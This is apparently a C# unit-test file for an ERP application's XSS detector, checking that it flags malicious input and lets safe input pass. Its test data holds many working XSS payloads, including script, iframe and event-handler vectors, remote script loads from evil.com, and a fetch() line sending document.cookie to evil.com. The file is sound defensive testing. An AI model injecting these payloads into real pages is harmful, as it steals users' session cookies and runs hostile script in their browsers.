using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Moq;
using ThinkOnErp.Domain.Interfaces;
using ThinkOnErp.Domain.Models;
using ThinkOnErp.Infrastructure.Configuration;
using ThinkOnErp.Infrastructure.Data;
using ThinkOnErp.Infrastructure.Services;
using Xunit;

namespace ThinkOnErp.Infrastructure.Tests.Services;

/// <summary>
/// Unit tests for SecurityMonitor XSS (Cross-Site Scripting) detection.
/// Tests XSS pattern detection as specified in Requirement 10.
/// **Validates: Requirements 10.5**
/// </summary>
public class SecurityMonitorXssTests
{
    private readonly Mock<OracleDbContext> _mockDbContext;
    private readonly Mock<ILogger<SecurityMonitor>> _mockLogger;
    private readonly SecurityMonitoringOptions _options;

    public SecurityMonitorXssTests()
    {
        _mockDbContext = new Mock<OracleDbContext>();
        _mockLogger = new Mock<ILogger<SecurityMonitor>>();
        
        _options = new SecurityMonitoringOptions
        {
            Enabled = true,
            EnableSqlInjectionDetection = true,
            EnableXssDetection = true,
            EnableAnomalousActivityDetection = true,
            FailedLoginThreshold = 5,
            FailedLoginWindowMinutes = 5,
            AnomalousActivityThreshold = 100,
            UseRedisCache = false
        };
    }

    [Fact]
    public async Task DetectXssAsync_WithNullInput_ReturnsNull()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(null!);

        // Assert
        Assert.Null(result);
    }

    [Fact]
    public async Task DetectXssAsync_WithEmptyInput_ReturnsNull()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(string.Empty);

        // Assert
        Assert.Null(result);
    }

    [Fact]
    public async Task DetectXssAsync_WithWhitespaceInput_ReturnsNull()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync("   ");

        // Assert
        Assert.Null(result);
    }

    [Fact]
    public async Task DetectXssAsync_WithSafeInput_ReturnsNull()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync("John Doe");

        // Assert
        Assert.Null(result);
    }

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<script>alert(\"XSS\")</script>")]
    [InlineData("<script>document.cookie</script>")]
    [InlineData("<script src='http://evil.com/xss.js'></script>")]
    [InlineData("<SCRIPT>alert('XSS')</SCRIPT>")]
    public async Task DetectXssAsync_WithScriptTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
        Assert.Contains("Cross-site scripting (XSS) pattern detected", result.Description);
        Assert.True(result.IsActive);
        Assert.NotNull(result.CorrelationId);
    }

    [Theory]
    [InlineData("<iframe src='http://evil.com'></iframe>")]
    [InlineData("<iframe src='javascript:alert(1)'></iframe>")]
    [InlineData("<IFRAME SRC='http://evil.com'></IFRAME>")]
    public async Task DetectXssAsync_WithIframeTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<object data='http://evil.com/malware.swf'></object>")]
    [InlineData("<object type='application/x-shockwave-flash'></object>")]
    public async Task DetectXssAsync_WithObjectTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<embed src='http://evil.com/malware.swf'>")]
    [InlineData("<EMBED SRC='http://evil.com'>")]
    public async Task DetectXssAsync_WithEmbedTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<applet code='Malicious.class'></applet>")]
    [InlineData("<APPLET CODE='Evil.class'>")]
    public async Task DetectXssAsync_WithAppletTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<meta http-equiv='refresh' content='0;url=http://evil.com'>")]
    [InlineData("<META HTTP-EQUIV='refresh'>")]
    public async Task DetectXssAsync_WithMetaTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<link rel='stylesheet' href='http://evil.com/xss.css'>")]
    [InlineData("<LINK REL='stylesheet'>")]
    public async Task DetectXssAsync_WithLinkTags_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("javascript:alert('XSS')")]
    [InlineData("javascript:void(0)")]
    [InlineData("JAVASCRIPT:alert(1)")]
    public async Task DetectXssAsync_WithJavascriptProtocol_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<img src='x' onerror='alert(1)'>")]
    [InlineData("<img src='x' onerror=\"alert('XSS')\">")]
    [InlineData("<IMG SRC='x' ONERROR='alert(1)'>")]
    public async Task DetectXssAsync_WithOnErrorHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<body onload='alert(1)'>")]
    [InlineData("<body onload=\"alert('XSS')\">")]
    [InlineData("<BODY ONLOAD='alert(1)'>")]
    public async Task DetectXssAsync_WithOnLoadHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<div onclick='alert(1)'>Click me</div>")]
    [InlineData("<button onclick=\"alert('XSS')\">Click</button>")]
    [InlineData("<DIV ONCLICK='alert(1)'>")]
    public async Task DetectXssAsync_WithOnClickHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<div onmouseover='alert(1)'>Hover me</div>")]
    [InlineData("<span onmouseover=\"alert('XSS')\">Hover</span>")]
    [InlineData("<DIV ONMOUSEOVER='alert(1)'>")]
    public async Task DetectXssAsync_WithOnMouseOverHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<input onfocus='alert(1)'>")]
    [InlineData("<INPUT ONFOCUS=\"alert('XSS')\">")]
    public async Task DetectXssAsync_WithOnFocusHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<input onblur='alert(1)'>")]
    [InlineData("<INPUT ONBLUR=\"alert('XSS')\">")]
    public async Task DetectXssAsync_WithOnBlurHandler_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("eval('alert(1)')")]
    [InlineData("eval(\"alert('XSS')\")")]
    [InlineData("EVAL('alert(1)')")]
    public async Task DetectXssAsync_WithEvalFunction_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("<div style='width: expression(alert(1))'>")]
    [InlineData("<DIV STYLE='width: EXPRESSION(alert(1))'>")]
    public async Task DetectXssAsync_WithExpressionFunction_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Theory]
    [InlineData("user@example.com")]
    [InlineData("123-456-7890")]
    [InlineData("Product Name (2024)")]
    [InlineData("Price: $99.99")]
    [InlineData("Hello World")]
    [InlineData("This is a normal comment")]
    public async Task DetectXssAsync_WithNormalUserInput_ReturnsNull(string safeInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(safeInput);

        // Assert
        Assert.Null(result);
    }

    [Theory]
    [InlineData("<p>This is a paragraph</p>")]
    [InlineData("<div>Normal content</div>")]
    [InlineData("<span>Text</span>")]
    [InlineData("<a href='http://example.com'>Link</a>")]
    public async Task DetectXssAsync_WithSafeHtmlTags_ReturnsNull(string safeInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(safeInput);

        // Assert
        Assert.Null(result);
    }

    [Fact]
    public async Task DetectXssAsync_WithMaliciousInput_IncludesMetadata()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<script>alert('XSS')</script>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.NotNull(result.Metadata);
        Assert.Contains("MatchedPattern", result.Metadata);
        Assert.Contains("InputLength", result.Metadata);
    }

    [Fact]
    public async Task DetectXssAsync_WithMaliciousInput_MasksSensitiveData()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<script>alert('XSS with very long malicious payload containing sensitive information')</script>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.NotNull(result.TriggerData);
        // TriggerData should be masked if input is long
        if (maliciousInput.Length > 20)
        {
            Assert.Contains("...", result.TriggerData);
        }
    }

    [Fact]
    public async Task DetectXssAsync_WithMaliciousInput_SetsCorrectThreatProperties()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<script>alert('XSS')</script>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
        Assert.True(result.IsActive);
        Assert.NotNull(result.CorrelationId);
        Assert.NotNull(result.Description);
        Assert.Contains("Cross-site scripting (XSS) pattern detected", result.Description);
        Assert.True(result.DetectedAt <= DateTime.UtcNow);
        Assert.True(result.DetectedAt >= DateTime.UtcNow.AddSeconds(-5));
    }

    [Fact]
    public async Task DetectXssAsync_LogsWarningWhenThreatDetected()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<script>alert('XSS')</script>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        _mockLogger.Verify(
            x => x.Log(
                LogLevel.Warning,
                It.IsAny<EventId>(),
                It.Is<It.IsAnyType>((v, t) => v.ToString()!.Contains("XSS pattern detected")),
                It.IsAny<Exception>(),
                It.IsAny<Func<It.IsAnyType, Exception?, string>>()),
            Times.Once);
    }

    [Theory]
    [InlineData("normal input")]
    [InlineData("user@example.com")]
    [InlineData("John Doe")]
    public async Task DetectXssAsync_WithSafeInput_DoesNotLogWarning(string safeInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(safeInput);

        // Assert
        Assert.Null(result);
        _mockLogger.Verify(
            x => x.Log(
                LogLevel.Warning,
                It.IsAny<EventId>(),
                It.Is<It.IsAnyType>((v, t) => v.ToString()!.Contains("XSS")),
                It.IsAny<Exception>(),
                It.IsAny<Func<It.IsAnyType, Exception?, string>>()),
            Times.Never);
    }

    [Fact]
    public async Task DetectXssAsync_WithCaseInsensitivePattern_DetectsThreat()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Test various case combinations
        var inputs = new[]
        {
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<Script>alert(1)</Script>",
            "<ScRiPt>alert(1)</ScRiPt>"
        };

        foreach (var input in inputs)
        {
            // Act
            var result = await monitor.DetectXssAsync(input);

            // Assert
            Assert.NotNull(result);
            Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        }
    }

    [Theory]
    [InlineData("<img src='x' onerror='alert(1)'>")]
    [InlineData("<body onload='alert(1)'>")]
    [InlineData("<iframe src='javascript:alert(1)'>")]
    [InlineData("<object data='http://evil.com'>")]
    [InlineData("<embed src='http://evil.com'>")]
    public async Task DetectXssAsync_WithVariousXssVectors_DetectsThreat(string maliciousInput)
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Fact]
    public async Task DetectXssAsync_WithComplexXssPayload_DetectsThreat()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<div><script>var x = document.cookie; fetch('http://evil.com?c=' + x);</script></div>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }

    [Fact]
    public async Task DetectXssAsync_WithNestedXssPayload_DetectsThreat()
    {
        // Arrange
        var monitor = new SecurityMonitor(
            _mockDbContext.Object,
            _mockLogger.Object,
            Options.Create(_options),
            null);
        var maliciousInput = "<div><iframe><script>alert('XSS')</script></iframe></div>";

        // Act
        var result = await monitor.DetectXssAsync(maliciousInput);

        // Assert
        Assert.NotNull(result);
        Assert.Equal(ThreatType.XssAttempt, result.ThreatType);
        Assert.Equal(ThreatSeverity.High, result.Severity);
    }
}
